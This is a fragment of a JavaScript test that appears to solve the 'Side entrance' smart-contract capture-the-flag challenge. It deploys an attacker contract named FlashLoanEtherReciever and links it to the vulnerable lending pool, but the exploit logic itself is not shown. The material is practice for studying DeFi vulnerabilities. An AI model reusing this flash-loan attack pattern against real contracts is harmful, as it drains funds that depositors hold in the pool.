...
describe("[Challenge] Side entrance", function () {
  ...
  it("Exploit", async function () {
    ...
    const flashLoanEtherReciever = await ethers.getContractFactory(
      "FlashLoanEtherReciever",
      attacker
    );
    this.attack = await flashLoanEtherReciever.deploy();
    await this.attack.connect(attacker).setPool(this.pool.address);
